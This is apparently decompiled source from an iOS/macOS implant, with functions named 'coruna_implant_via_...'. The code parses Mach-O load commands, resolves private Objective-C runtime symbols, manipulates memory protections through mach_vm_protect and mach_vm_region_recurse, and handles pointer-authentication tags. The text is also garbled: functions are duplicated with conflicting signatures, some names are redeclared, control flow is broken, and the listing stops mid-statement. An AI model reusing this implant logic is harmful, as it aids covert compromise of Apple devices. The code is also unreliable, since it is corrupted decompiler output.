  
  version = 0xad001;
  if (((arg != 0) && (id_2 != (unsigned long *)0x0)) && ((size & 3) == 0)) {
    u = 0xffffff;
    if (count_2 == 0) {
      u = 0xffff;
    }
    while( true ) {
      bootargs = 0;
      buf = *(unsigned long **)(arg + 8);
      ptr = (unsigned long *)(*(long *)(arg + 0x10) + (long)buf);
      if (((((ptr < buf || id_2 < buf) || ptr <= id_2) ||
           (unsigned long *)0xfffffffffffffff7 < id_2) || id_2 + 1 < buf) || ptr < id_2 + 1)
      break;
    }
    version = 0x920006;
  }
  return version;
}





uint64_t coruna_block_dispose(long handle,unsigned long *arg,long addr_2)
{
  char err;
  uint64_t u;
  unsigned long size;
  uint8_t *scratch;
  uint64_t bootargs;
  void (*thread_attr)(void);
  uint8_t *host_info;
  uint64_t *serial_buf;
  long action;
  long block_ctx;
  uint64_t stack_guard;
  uint64_t *sa_saved;
  uint64_t sa_new;
  uint8_t path_buf;
  
  u = 0;
  if (((handle != 0) && (arg != (unsigned long *)0x0)) && (addr_2 != 0)) {
    if (((*(double *)k_implant_dyldversionnumber_slot < 800.0) && (size = *arg, (long)size < 0)
        ) && (((size & 0x6000000000000) == 0x4000000000000 && ((size & 0xffff00000000) != 0)))) {
      serial_buf = &stack_guard;
      stack_guard = 0;
      sa_new = k_implant_rodata_word_26a68;
      path_buf = 0;
      scratch = k_implant_nsconcretestackblock_slot;
      bootargs = k_implant_rodata_word_26a70;
      thread_attr = coruna_check_objc_section;
      host_info = &k_implant_rodata_word_28630;
      action = addr_2;
      block_ctx = handle;
      sa_saved = serial_buf;
      coruna_macho_foreach_loadcmd(handle,0x19,&scratch);
      err = *(char *)(sa_saved + 3);
      __Block_object_dispose(&stack_guard,8);
      if (err != '\0') {
        return 0;
      }
    }
    u = 1;
  }
  return u;
}



coruna_svc_regpack_t coruna_pac_sig_ext(unsigned long arg,unsigned long val,uint64_t n)

{
  uint8_t tag[16];
  
  if ((long)arg < 0) {
    val = val & 0xffffffffffff | (arg >> 0x20) << 0x30;
    switch(arg >> 0x31 & 3) {
    default:
      break;
    }
  }
  tag = val;
  tag = n;
  return tag;
}





uint64_t coruna_check_objc_section(long handle,long addr_2)
{
  unsigned long u;
  unsigned long size;
  unsigned long version;
  unsigned long port;
  int err;
  char *ptr;
  uint64_t tag;
  char *buf;
  long handle;
  long addr;
  
  port = *(unsigned long *)(handle + 0x28);
  addr = *(long *)(*(long *)(handle + 0x30) + 0x18);
  size = addr + *(long *)(addr_2 + 0x18);
  u = port + 1;
  version = size + *(long *)(addr_2 + 0x20);
  if ((((((version >= size && port >= size) && port <= version) &&
        ((version < size || port < size) || version != port)) && port != 0xffffffffffffffff) &&
      size <= u) && u <= version) {
    tag = 0xad017;
    err = _strncmp((char *)(addr_2 + 8),"__DATA",6);
    if (err == 0) {
      buf = (char *)(addr_2 + 0x48);
      ptr = buf + (unsigned long)*(uint *)(addr_2 + 0x40) * 0x50;
      handle = *(long *)(*(long *)(handle + 0x20) + 8);
      if (*(char *)(handle + 0x18) == '\0' && buf < ptr) {
        do {
          size = *(long *)(buf + 0x20) + addr;
          version = size + *(long *)(buf + 0x28);
          if (((((version >= size && port >= size) && port <= version) &&
               ((version < size || port < size) || version != port)) && size <= u) &&
              u <= version) {
            err = _strncmp(buf,"__cfstring",0xc);
            if ((err != 0) && (err = _strncmp(buf,"__objc",6), err != 0)) {
              return 0xad017;
            }
            *(uint8_t *)(handle + 0x18) = 1;
            return 0xad017;
          }
          buf = buf + 0x50;
        } while (buf < ptr);
      }
    }
  }
  else {
    tag = 0;
  }
  return tag;
}





void coruna_block_assign(long handle,long addr_2)
{
  __Block_object_assign((void *)(handle + 0x20),*(void **)(addr_2 + 0x20),8);
  return;
}





void coruna_block_dispose_byref(long handle)
{
  __Block_object_dispose(*(void **)(handle + 0x20),8);
  return;
}





uint64_t
uint64_t coruna_bind_interpret(int64_t arg,int64_t arg,uint64_t val,int64_t val,int flags,uint64_t id_2)
{
  unsigned long *ptr;
  unsigned long *buf;
  ushort u;
  uint size;
  bool err;
  uint64_t version;
  uint32_t port;
  uint64_t tag;
  uint kind;
  unsigned long type_id;
  unsigned long type_id_8;
  long handle;
  unsigned long *scratch [2];
  
  version = 0xad001;
  if ((arg != 0) && (arg != 0)) {
    scratch[0] = (unsigned long *)0x0;
    version = coruna_block_dispose(arg,*(long *)(arg + 8) + (id_2 & 0xffffffff) +
                                 (unsigned long)((uint)*(ushort *)(arg + 4) * flags),scratch);
    if ((int)version == 0) {
      tag = 0x920006;
      u = *(ushort *)(arg + 6);
      version = 0x920005;
      if (u < 0xd) {
        kind = (uint)u;
        size = 1 << (unsigned long)(kind & 0x1f);
        if ((size & 0x1282) == 0) {
          if (((size & 0x44) != 0) && (version = 0xad001, scratch[0] != (unsigned long *)0x0)) {
            buf = *(unsigned long **)(arg + 8);
            ptr = (unsigned long *)(*(long *)(arg + 0x10) + (long)buf);
            version = tag;
            if (((buf <= ptr) &&
                (((buf <= scratch[0] && (scratch[0] < ptr)) &&
                 (scratch[0] < (unsigned long *)0xfffffffffffffff8)))) &&
               ((buf <= scratch[0] + 1 && (scratch[0] + 1 <= ptr)))) {
              do {
                type_id = *scratch[0];
                if ((long)type_id < 0) {
                  if ((uint)val <= (uint)(type_id & 0xffffff)) {
                    return 0x920001;
                  }
                  type_id_8 = *(long *)(val + (type_id & 0xffffff) * 8) + (type_id >> 0x18 & 0xff);
                }
                else {
                  if (kind == 2) {
                    handle = *(long *)(arg + 0x50);
                  }
                  else {
                    handle = *(long *)(arg + 0x40);
                  }
                  type_id_8 = handle + (type_id & 0xfffffffff | (type_id >> 0x24) << 0x38);
                }
                *scratch[0] = type_id_8;
                if ((type_id >> 0x33 & 0xfff) == 0) {
                  return 0;
                }
                buf = *(unsigned long **)(arg + 8);
                ptr = (unsigned long *)(*(long *)(arg + 0x10) + (long)buf);
                if (ptr < buf) {
                  return 0x920006;
                }
                scratch[0] = (unsigned long *)((long)scratch[0] +
                                       (unsigned long)(((uint)(type_id >> 0x33) & 0xfff) << 2));
                err = scratch[0] < buf;
              } while (((((!err && scratch[0] <= ptr) && (err || ptr != scratch[0])) &&
                         scratch[0] < (unsigned long *)0xfffffffffffffff7 ||
                        ((!err && scratch[0] <= ptr) && (err || ptr != scratch[0])) &&
                        scratch[0] == (unsigned long *)0xfffffffffffffff7) && buf <= scratch[0] + 1) &&
                       scratch[0] + 1 <= ptr);
            }
          }
        }
        else {
          port = 4;
          if (u != 7) {
            port = 8;
          }
          version = coruna_return_zero_15594(arg,val,val,scratch[0],kind != 1,port,kind == 0xc);
        }
      }
    }
  }
  return version;
}





uint64_t coruna_objc_resolve_method(long handle,long addr_2,int flags)
{
  uint64_t u;
  long handle;
  uint64_t size;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t scratch;
  
  u = 0xad001;
  if ((((handle != 0) && (handle = *(long *)(handle + 0x38), handle != 0)) &&
      (*(long *)(handle + 0x40) != 0)) && ((*(long *)(handle + 0x48) != 0 && (addr_2 != 0)))) {
    if ((flags == 0x3c) || (flags == 0x28)) {
      size = *(uint64_t *)(addr_2 + 8);
      bootargs = 0;
      scratch = 0;
      scratch = size;
      if (((*(int *)(handle + 0x50) != 2) || (flags != 0x28)) ||
         (u = coruna_implant_via_identity(handle,handle,handle + 0x58), (int)u == 0)) {
        if (flags == 0x28) {
          (**(void (**)(handle + 0x40))(1,&bootargs,&scratch);
          if (*(int *)(handle + 0x50) == 1) {
            coruna_find_data_dirty(handle);
          }
        }
        else {
          (**(void (**)(handle + 0x48))(0,size);
        }
        u = 0;
      }
    }
    else {
      u = 0x1800b;
    }
  }
  return u;
}





uint32_t coruna_find_data_dirty(long handle)
{
  int err;
  byte err;
  int status;
  uint32_t u;
  long handle;
  long addr;
  int *err;
  unsigned long size;
  int flags;
  int *status;
  
  if (handle == 0) {
    u = 0xad001;
  }
  else {
    err = *(int *)(handle + 0x10);
    u = 0x18006;
    if (err != 0) {
      err = 0;
      flags = 0;
      handle = 0;
      addr = 0;
      status = (int *)(handle + 0x20);
      do {
        if (*status == 0x19) {
          status = _strcmp((char *)(status + 2),"__TEXT");
          if (status == 0) {
            handle = handle - *(long *)(status + 6);
            err = 1;
          }
          else {
            status = _strcmp((char *)(status + 2),"__DATA_DIRTY");
            if ((status == 0) && (size = (unsigned long)(uint)status[0x10], status[0x10] != 0)) {
              err = status + 0x12;
              do {
                status = _strcmp((char *)err,"__common");
                if (status == 0) {
                  addr = handle + *(long *)(err + 8);
                }
                err = err + 0x14;
                size = size - 1;
              } while (size != 0);
            }
          }
        }
        status = (int *)((long)status + (unsigned long)(uint)status[1]);
        flags = flags + 1;
      } while (flags != err);
      u = 0x1800c;
      if (!(bool)(err & addr != 0)) {
        u = 0x18006;
      }
    }
  }
  return u;
}
uint64_t coruna_objc_flush_caches(long handle)
{
  bool err;
  unsigned long u;
  unsigned long size;
  uint32_t version;
  char *ptr;
  uint port;
  unsigned long tag;
  unsigned long kind;
  bool status;
  bool flags;
  bool count;
  bool idx;
  bool i;
  int err;
  long handle;
  long addr;
  unsigned long type_id;
  unsigned long type_id_8;
  uint64_t type_id_9;
  uint type_id_10;
  uint32_t type_id_11;
  int *err;
  unsigned long *ptr;
  long off;
  unsigned long type_id_12;
  unsigned long *buf;
  unsigned long type_id_13;
  uint64_t type_id_14;
  unsigned long scratch;
  unsigned long bootargs;
  long thread_attr;
  unsigned long host_info [6];
  unsigned long *serial_buf;
  
  if (handle == 0) {
    return 0xad001;
  }
  type_id_14 = 0x18008;
  handle = _dlopen("/usr/lib/libobjc.A.dylib",2);
  if (handle == 0) {
    return 0x18004;
  }
  host_info[2] = 0;
  host_info[1] = 0;
  host_info[4] = 0;
  host_info[3] = 0;
  addr = _dlsym(handle,"object_getClass");
  type_id = _dlsym(handle,"_objc_patch_root_of_class");
  type_id_8 = _dlsym(handle,"_objc_map_images");
  if (addr == 0) {
    type_id_9 = 0x18002;
  }
  else {
    err = _dladdr(addr,host_info + 1);
    kind = host_info[2];
    type_id_9 = 0x18003;
    if ((err != 0) && (host_info[2] != 0)) {
      thread_attr = 0;
      host_info[0] = 0;
      type_id_9 = coruna_macho_text_seg("__TEXT","__text",host_info[2],host_info,&thread_attr);
      tag = host_info[0];
      addr = thread_attr;
      if ((int)type_id_9 == 0) {
        err = *(int *)(kind + 0x10);
        if (err != 0) {
          err = (int *)(kind + 0x20);
          do {
            if (*err == 0x25) {
              off = 8;
              port = *(uint *)((long)err + off);
              scratch = 0;
              bootargs = 0;
              count = host_info[0] == 0;
              idx = thread_attr == 0;
              type_id_13 = bootargs;
              bootargs = type_id_13;
              host_info[5] = 0;
              type_id_9 = 0xad001;
              if ((count || idx) ||
              (type_id_9 = coruna_implant_via_ctx_free_2(handle,kind,0,0x10,host_info + 5), (int)type_id_9 != 0))
              _dlclose(handle);
              return type_id_9;
            }
            if (*err == 0x32) {
              off = 0xc;
              port = *(uint *)((long)err + off);
              scratch = 0;
              bootargs = 0;
              count = host_info[0] == 0;
              idx = thread_attr == 0;
              type_id_13 = bootargs;
              bootargs = type_id_13;
              host_info[5] = 0;
              type_id_9 = 0xad001;
              if ((count || idx) ||
              (type_id_9 = coruna_implant_via_ctx_free_2(handle,kind,0,0x10,host_info + 5), (int)type_id_9 != 0))
              _dlclose(handle);
              return type_id_9;
            }
            err = (int *)((long)err + (unsigned long)(uint)err[1]);
            err = err + -1;
          } while (err != 0);
        }
        type_id_9 = 0x18009;
      }
    }
  }
  _dlclose(handle);
  return type_id_9;
}





uint64_t coruna_mutex_destroy(long handle)
{
  if (handle != 0) {
    if (*(int *)(handle + 0x50) == 2) {
      _pthread_mutex_destroy((pthread_mutex_t *)(handle + 0x58));
      *(uint64_t *)(handle + 0x60) = 0;
      *(uint64_t *)(handle + 0x58) = 0;
      *(uint64_t *)(handle + 0x70) = 0;
      *(uint64_t *)(handle + 0x68) = 0;
      *(uint64_t *)(handle + 0x80) = 0;
      *(uint64_t *)(handle + 0x78) = 0;
      *(uint64_t *)(handle + 0x90) = 0;
      *(uint64_t *)(handle + 0x88) = 0;
      *(uint64_t *)(handle + 0xa0) = 0;
      *(uint64_t *)(handle + 0x98) = 0;
      *(uint64_t *)(handle + 0xa8) = 0;
    }
    *(uint64_t *)(handle + 0xa8) = 0;
    *(uint64_t *)(handle + 0x90) = 0;
    *(uint64_t *)(handle + 0x88) = 0;
    *(uint64_t *)(handle + 0xa0) = 0;
    *(uint64_t *)(handle + 0x98) = 0;
    *(uint64_t *)(handle + 0x70) = 0;
    *(uint64_t *)(handle + 0x68) = 0;
    *(uint64_t *)(handle + 0x80) = 0;
    *(uint64_t *)(handle + 0x78) = 0;
    *(uint64_t *)(handle + 0x50) = 0;
    *(uint64_t *)(handle + 0x48) = 0;
    *(uint64_t *)(handle + 0x60) = 0;
    *(uint64_t *)(handle + 0x58) = 0;
    *(uint64_t *)(handle + 0x30) = 0;
    *(uint64_t *)(handle + 0x28) = 0;
    *(uint64_t *)(handle + 0x40) = 0;
    *(uint64_t *)(handle + 0x38) = 0;
    return 0;
  }
  return 0xad001;
}





uint64_t coruna_objc_metaclass_prefix(long *handle)
{
  int err;
  int status;
  uint64_t u;
  long handle;
  char *ptr;
  long addr;
  unsigned long size;
  long off;
  
  if (handle == (long *)0x0) {
    u = 0xad001;
  }
  else {
    addr = 0;
    handle = *handle;
    size = 0xffffffffffffffff;
    do {
      size = size + 1;
      if (*(uint *)(handle + 0x16) <= size) {
        return 0;
      }
      off = handle[0x15];
      ptr = *(char **)(off + addr);
      err = _strncmp(ptr,"_OBJC_CLASS_$_",0xe);
      if ((err == 0) || (status = _strncmp(ptr,"_OBJC_METACLASS_$_",0x12), status == 0)) {
        u = coruna_objc_nsobject_pair(handle,handle + 0x28,*(uint64_t *)(off + addr + 8),err != 0);
      }
      else {
        u = 0;
      }
      addr = addr + 0x10;
    } while ((int)u == 0);
  }
  return u;
}





int coruna_objc_nsobject_pair(long handle,long *addr_2,uint64_t *val,unsigned long arg)
{
  uint64_t *ptr;
  unsigned long *buf;
  uint64_t *str;
  uint64_t *copy;
  unsigned long u;
  uint64_t size;
  int err;
  uint64_t version;
  long handle;
  unsigned long port;
  
  err = 0xad001;
  if (((handle != 0) && (addr_2 != (long *)0x0)) &&
     (*addr_2 != 0 && val != (uint64_t *)0x0)) {
    handle = 0;
    port = 0;
    ptr = val + 5;
    err = 0xad011;
    while (err == 0xad011) {
      if (*(uint *)(handle + 0x88) <= port) {
        return 0xad011;
      }
      buf = (unsigned long *)(*(long *)(handle + 0x80) + handle);
      copy = (uint64_t *)*buf;
      u = buf[1];
      str = (uint64_t *)((long)copy + u);
      port = port + 1;
      err = 0;
      if (((((ptr > str || copy > ptr) || str <= val) || copy > val) ||
          u == 0xffffffffffffffff) ||
          (((ptr <= str && copy <= ptr) && val < str) && copy <= val) &&
          (long)u < -1) {
        err = 0xad011;
      }
      handle = handle + 0x18;
    }
    if (err == 0) {
      size = _dlsym(*addr_2,"OBJC_METACLASS_$_NSObject");
      *val = size;
      if ((arg & 1) == 0) {
        size = _dlsym(*addr_2,"OBJC_CLASS_$_NSObject");
      }
      val[1] = size;
      size = _dlsym(*addr_2,"_objc_empty_cache");
      val[2] = size;
      size = _dlsym(*addr_2,"_objc_empty_vtable");
      err = 0;
      version = *(uint64_t *)(handle + 8);
      val[3] = size;
      val[4] = version;
    }
  }
  return err;
}





uint64_t coruna_objc_scan_methlist(long handle,long addr_2)
{
  uint64_t u;
  uint8_t *scratch;
  uint64_t bootargs;
  void (*thread_attr)(void);
  uint8_t *host_info;
  long serial_buf;
  
  u = 0xad001;
  if (((((handle != 0) && (*(long *)(handle + 0x38) != 0)) && (*(long *)(handle + 0x40) != 0)) &&
      ((*(long *)(handle + 0x48) != 0 && (addr_2 != 0)))) &&
     ((*(char *)(addr_2 + 0xfc) != '\0' &&
      ((u = 0, (*(ushort *)(addr_2 + 0x1c0) >> 8 & 1) != 0 &&
       (*(uint *)(handle + 0x30) >> 0x11 < 7)))))) {
    scratch = k_implant_nsconcretestackblock_slot;
    bootargs = k_implant_rodata_word_26a78;
    thread_attr = coruna_find_objc_methlist;
    host_info = &k_implant_rodata_word_28660;
    serial_buf = addr_2;
    u = coruna_macho_foreach_loadcmd(addr_2,0x19,&scratch);
  }
  return u;
}





uint64_t coruna_objc_metaclass_prefix(long handle,long addr_2)
{
  int err;
  uint64_t u;
  char *ptr;
  long handle;
  unsigned long size;
  long addr;
  
  u = 0xad001;
  if (((((handle != 0) && (*(long *)(handle + 0x38) != 0)) && (*(long *)(handle + 0x40) != 0)) &&
      ((*(long *)(handle + 0x48) != 0 && (addr_2 != 0)))) && (*(char *)(addr_2 + 0xfc) != '\0'))
  {
    handle = 0;
    size = 0xffffffffffffffff;
    do {
      size = size + 1;
      if (*(uint *)(addr_2 + 0xb0) <= size) {
        return 0;
      }
      addr = *(long *)(addr_2 + 0xa8);
      ptr = *(char **)(addr + handle);
      err = _strncmp(ptr,"_OBJC_CLASS_$_",0xe);
      if ((err == 0) || (err = _strncmp(ptr,"_OBJC_METACLASS_$_",0x12), err == 0)) {
        u = coruna_check_objc_section(addr_2,handle + 0x28,*(uint64_t *)(addr + handle + 8));
      }
      else {
        u = 0;
      }
      handle = handle + 0x10;
    } while ((int)u == 0);
  }
  return u;
}





int coruna_check_objc_section(long handle,long *addr_2,unsigned long *arg)
{
  unsigned long *ptr;
  unsigned long *buf;
  unsigned long *str;
  unsigned long u;
  int err;
  long handle;
  unsigned long size;
  unsigned long version;
  
  err = 0xad001;
  if (((handle != 0) && (addr_2 != (long *)0x0)) && (*addr_2 != 0 && arg != (unsigned long *)0x0)) {
    handle = 0;
    size = 0;
    ptr = arg + 5;
    err = 0xad011;
    while (err == 0xad011) {
      if (*(uint *)(handle + 0x88) <= size) {
        return 0xad011;
      }
      buf = (unsigned long *)(*(long *)(handle + 0x80) + handle);
      str = (unsigned long *)*buf;
      version = buf[1];
      buf = (unsigned long *)((long)str + version);
      size = size + 1;
      err = 0;
      if (((((ptr > buf || str > ptr) || buf <= arg) || str > arg) ||
          version == 0xffffffffffffffff) ||
          (((ptr <= buf && str <= ptr) && arg < buf) && str <= arg) &&
          (long)version < -1) {
        err = 0xad011;
      }
      handle = handle + 0x18;
    }
    if (err == 0) {
      version = *arg;
      size = version & 0x7ffffffffffff8;
      if ((size != 0) && (u = coruna_identity(size), size == u)) {
        *arg = version;
      }
      size = arg[1];
      if ((size == 0) || (version = coruna_identity(size), size != version)) {
        err = 0;
      }
      else {
        err = 0;
        arg[1] = size;
      }
    }
  }
  return err;
}





uint64_t coruna_macho_text_seg(char *path,char *str_2,long handle,long *addr_2,uint64_t *val)
{
  uint64_t u;
  int err;
  int status;
  uint64_t size;
  int *err;
  int *status;
  int flags;
  int *flags;
  unsigned long version;
  int *count;
  int *idx;
  
  size = 0x18006;
  err = *(int *)(handle + 0x10);
  if (err != 0) {
    err = (int *)0x0;
    flags = 0;
    flags = (int *)(handle + 0x20);
    count = (int *)0x0;
    do {
      idx = count;
      if ((count != (int *)0x0) && (err != (int *)0x0)) break;
      if (*flags == 0x19) {
        status = _strcmp((char *)(flags + 2),"__TEXT");
        idx = flags;
        if (status != 0) {
          idx = count;
        }
        if (err == (int *)0x0) {
          status = _strcmp((char *)(flags + 2),path);
          if ((status == 0) && (version = (unsigned long)(uint)flags[0x10], flags[0x10] != 0)) {
            count = flags + 0x12;
            status = (int *)0x0;
            do {
              status = _strcmp((char *)count,str_2);
              err = count;
              if (status != 0) {
                err = status;
              }
              count = count + 0x14;
              version = version - 1;
              status = err;
            } while (version != 0);
          }
          else {
            err = (int *)0x0;
          }
        }
      }
      flags = (int *)((long)flags + (unsigned long)(uint)flags[1]);
      flags = flags + 1;
      count = idx;
    } while (flags != err);
    size = 0x18006;
    if ((idx != (int *)0x0) && (err != (int *)0x0)) {
      size = 0;
      u = *(uint64_t *)(err + 10);
      *addr_2 = (handle - *(long *)(idx + 6)) + *(long *)(err + 8);
      *val = u;
    }
  }
  return size;
}





uint64_t coruna_dladdr(unsigned long arg,int flags,long handle,long addr_2,unsigned long *arg)
{
  int err;
  unsigned long u;
  uint64_t size;
  unsigned long version;
  uint64_t scratch;
  uint64_t scratch;
  uint64_t bootargs;
  unsigned long bootargs;
  
  size = 0xad001;
  if (((arg != 0) && (handle != 0)) && (arg != (unsigned long *)0x0)) {
    size = 0x18005;
    scratch = 0;
    scratch = 0;
    bootargs = 0;
    bootargs = 0;
    u = arg;
    while (arg < (unsigned long)(handle + addr_2)) {
      err = _dladdr(arg,&scratch);
      version = arg;
      if ((err != 0) && (u != bootargs)) {
        flags = flags + -1;
        if (flags == 0) {
          *arg = bootargs;
          return 0;
        }
        u = bootargs;
        version = bootargs;
        if (bootargs <= arg) {
          version = arg;
        }
      }
      arg = version + 1;
    }
  }
  return size;
}
uint coruna_find_objc_methlist(long handle,long addr_2)
{
  uint u;
  bool err;
  int err;
  unsigned long size;
  unsigned long version;
  
  err = _strcmp((char *)(addr_2 + 8),"__TEXT");
  if ((err == 0) &&
     (size = addr_2 + 0x48U + (unsigned long)*(uint *)(addr_2 + 0x40) * 0x50, addr_2 + 0x48U < size)) {
    version = addr_2 + 0x98;
    do {
      err = _strcmp((char *)(version - 0x50),"__objc_methlist");
      if ((err == 0) &&
         (u = *(int *)(*(long *)(*(long *)(handle + 0x20) + 0x18) + *(long *)(version - 0x30)) >>
                  0x1f & 0x18014, u != 0)) {
        return u;
      }
      err = version < size;
      version = version + 0x50;
    } while (err);
  }
  return 0;
}





uint coruna_vm_region_recurse(vm_map_t arg,mach_vm_address_t arg_x,long handle,uint *size,
                 uint8_t *buf,long addr_2)
{
  uint u;
  bool err;
  uint size;
  kern_return_t lk4;
  uint8_t version;
  natural_t scratch;
  mach_msg_type_number_t bootargs;
  unsigned long thread_attr [5];
  short host_info;
  uint64_t scratch;
  mach_vm_size_t serial_buf;
  mach_vm_address_t action;
  
  serial_buf = 0;
  thread_attr[3] = 0;
  thread_attr[2] = 0;
  scratch = 0;
  thread_attr[4] = 0;
  thread_attr[1] = 0;
  thread_attr[0] = 0;
  bootargs = 0xc;
  size = 0xad001;
  if (((size != (uint *)0x0) && (buf != (uint8_t *)0x0)) && (addr_2 != 0)) {
    scratch = 1;
    action = arg_x;
    size = _mach_vm_region_recurse
                      (arg,&action,&serial_buf,&scratch,(vm_region_recurse_info_t)thread_attr,
                       &bootargs);
    if (size == 0) {
      u = (uint)thread_attr[0];
      err = host_info != 0;
      size = (uint)thread_attr[0] >> 2 & 1;
      version = (uint8_t)size;
      if ((serial_buf + action < handle + arg_x) && (((uint)thread_attr[0] >> 2 & 1) == 0)) {
        do {
          version = (uint8_t)size;
          scratch = 1;
          bootargs = 0xc;
          lk4 = _mach_vm_region_recurse
                            (arg,&action,&serial_buf,&scratch,
                             (vm_region_recurse_info_t)thread_attr,&bootargs);
          if (lk4 != 0) break;
          size = (uint)thread_attr[0] >> 2 & 1;
          version = (uint8_t)size;
          action = action + serial_buf;
        } while (action + serial_buf < handle + arg_x && (thread_attr[0] & 4) == 0);
      }
      size = 0;
      *size = u;
      *buf = version;
      *(bool *)addr_2 = err;
    }
    else {
      size = size | 0x80000000;
    }
  }
  return size;
}





unsigned long coruna_mach_vm_protect(long arg,long val,unsigned long n,mach_vm_address_t m,
                  mach_vm_size_t p,uint q)

{
  uint32_t u;
  uint size;
  unsigned long type_id;
  void (*copy)(void);
  vm_map_t target_task;
  unsigned long cache_34;
  mach_vm_address_t path_buf;
  mach_vm_size_t cache_36;
  uint region;
  uint32_t cache_33;
  uint32_t stack_guard;
  uint64_t cache_47;
  uint16_t cache_48;
  uint cache_42;
  
  if (arg == 0) {
    return 0xad001;
  }
  if (*(long *)(arg + 0x28) == 0 || val == 0) {
    return 0xad001;
  }
  cache_42 = 0;
  cache_48 = 0;
  type_id = coruna_vm_region_recurse(n,m,p,&cache_42,(long)&cache_48 + 1,&cache_48);
  if ((int)type_id != 0) {
    return type_id;
  }
  target_task = (vm_map_t)n;
  if ((q >> 2 & 1) == 0) {
    if (cache_48 != '\0') {
      copy = *(void (**)(arg + 0x28);
      if (copy == (void (*)0x0) {
        type_id = 0xad001;
        (**(void (**)(arg + 0x28))(arg,val,0xc,n & 0xffffffff);
        return type_id;
      }
      region = 0;
      u = 0x40000012;
      cache_33 = 1;
      cache_34 = n & 0xffffffff;
      path_buf = m;
      cache_36 = p;
      type_id = (*copy)(arg,val,u,&cache_34);
      (**(void (**)(arg + 0x28))(arg,val,0xc,n & 0xffffffff);
      return type_id;
    }
    size = _mach_vm_protect(target_task,m,p,0,q);
    type_id = (unsigned long)(size | 0x80000000);
    (**(void (**)(arg + 0x28))(arg,val,0xc,n & 0xffffffff);
    return type_id;
  }
  else {
    region = cache_42;
    copy = *(void (**)(arg + 0x28);
    u = 0x40000021;
load_ok_31:
    cache_33 = 1;
    cache_34 = n & 0xffffffff;
    path_buf = m;
    cache_36 = p;
    type_id = (*copy)(arg,val,u,&cache_34);
    (**(void (**)(arg + 0x28))(arg,val,0xc,n & 0xffffffff);
    return type_id;
    }
    else {
    region = cache_42;
    copy = *(void (**)(arg + 0x28);
    u = 0x40000021;
    cache_33 = 1;
    cache_34 = n & 0xffffffff;
    path_buf = m;
    cache_36 = p;
    type_id = (*copy)(arg,val,u,&cache_34);
    (**(void (**)(arg + 0x28))(arg,val,0xc,n & 0xffffffff);
    return type_id;
  }
  if (k_implant_rodata_word_26a80 <= *(double *)k_implant_dyldversionnumber_slot && (int)type_id == 0) {
    cache_34 = coruna_u64_pack((cache_34), (target_task));
    region = region & 0xffffff00;
    cache_47 = 0;
    cache_33 = 0;
    stack_guard = 0;
    path_buf = m;
    cache_36 = p;
    type_id = (**(void (**)(arg + 0x28))(arg,val,0xc0000023,&cache_34);
    if ((int)type_id == 0) {
      if ((char)region == '\0') {
        type_id = 0;
      }
      else {
        region = region & 0xffffff00;
        type_id = (**(void (**)(arg + 0x28))(arg,val,0x40000023,&cache_34);
      }
    }
  }
load_ok_30:
  (**(void (**)(arg + 0x28))(arg,val,0xc,n & 0xffffffff);
  return type_id;
}





uint8_t *
uint64_t * coruna_implant_via_vm_region_recurse(int64_t arg,int64_t arg,uint64_t val,uint64_t id_2,uint64_t size_3)
{
  uint8_t *ptr;
  uint8_t *buf;
  uint16_t scratch;
  uint bootargs;
  unsigned long thread_attr;
  uint64_t scratch;
  uint64_t bootargs;
  unsigned long host_info;
  
  buf = (uint8_t *)0xad001;
  ptr = buf;
  if ((arg != 0) && (*(void (**)(arg + 0x28) != (void (*)0x0 && arg != 0)) {
    bootargs = 0;
    scratch = 0;
    ptr = (uint8_t *)(**(void (**)(arg + 0x28))(arg,arg,0xc,val & 0xffffffff);
    if (((int)ptr == 0) &&
       (ptr = (uint8_t *)
                 coruna_vm_region_recurse(val,id_2,size_3,&bootargs,(long)&scratch + 1,&scratch),
       (int)ptr == 0)) {
      if (scratch == '\0') {
        ptr = (uint8_t *)0x0;
      }
      else {
        if ((char)scratch == '\0') {
          buf = &UNK_00012013;
        }
        else if (*(void (**)(arg + 0x28) != (void (*)0x0) {
          thread_attr = val & 0xffffffff;
          host_info = (unsigned long)bootargs;
          scratch = id_2;
          bootargs = size_3;
          buf = (uint8_t *)(**(void (**)(arg + 0x28))(arg,arg,0x4000000e,&thread_attr);
        }
        (**(void (**)(arg + 0x28))(arg,arg,0xc,val & 0xffffffff);
        ptr = buf;
      }
    }
  }
  return ptr;
}





int coruna_macho_validate_header(long *handle)
{
  ushort u;
  ushort size;
  ushort version;
  uint port;
  int *err;
  
  if (((handle == (long *)0x0) || (err = (int *)handle[0x29], err == (int *)0x0)) ||
     (*handle == 0)) {
    return 0xad001;
  }
  if ((unsigned long)handle[0x2a] < 0x20) {
    return 0x13001;
  }
  if (*err == -0x1120531) {
    if ((unsigned long)handle[0x2a] < (unsigned long)(uint)err[5] + 0x20) {
      port = 0x6002;
    }
    else if (err[1] == 0x100000c) {
      port = err[2];
      if (((port & 0xffffff) < 3) || (*(char *)((long)handle + 0x1c2) != '\0')) {
        if ((((uint)err[6] >> 0x17 & 1) == 0) || (*(char *)((long)handle + 0x1c2) != '\0')) {
          u = *(ushort *)(handle + 0x38);
          version = u & 0x1f | (ushort)(((uint)err[6] >> 5 & 1) << 5);
          size = u & 0xffc0 | version;
          *(ushort *)(handle + 0x38) = size;
          if (1 < (port & 0xffffff)) {
            *(ushort *)(handle + 0x38) = size | 0x80;
            *(uint8_t *)(handle + 0x22) = 1;
            *(ushort *)(handle + 0x38) =
                 (ushort)((uint)err[2] >> 0x17) & 0x100 | u & 0xfec0 | version | 0x80;
          }
          handle[0x2e] = (long)err;
          handle[0x21] = (unsigned long)(uint)err[5] + 0x20;
          return 0;
        }
        port = 0x6006;
      }
      else {
        port = 0x6004;
      }
    }
    else {
      port = 0x6003;
    }
  }
  else {
    port = 0x6001;
  }
  return (port | 0xfff60000) + 0xad001;
}





uint64_t coruna_macho_foreach_loadcmd(long handle,int flags,long addr_2)
{
  int *err;
  uint u;
  uint64_t size;
  int *status;
  int *flags;
  long handle;
  int *count;
  uint version;
  
  size = 0xad001;
  if ((((handle != 0) && (*(long *)(handle + 0x170) != 0)) &&
      (flags = *(int **)(handle + 0x148), flags != (int *)0x0)) &&
     ((handle = *(long *)(handle + 0x150), handle != 0 && (addr_2 != 0)))) {
    u = *(uint *)(*(long *)(handle + 0x170) + 0x10);
    if (u == 0) {
      size = 0;
    }
    else {
      if (((-1 < handle) && (status = flags + 8, flags <= status)) &&
         ((count = (int *)((long)flags + handle), status < count &&
          ((flags <= flags + 10 && (flags + 10 <= count)))))) {
        version = 1;
        while (err = (int *)((long)status + (unsigned long)(uint)status[1]),
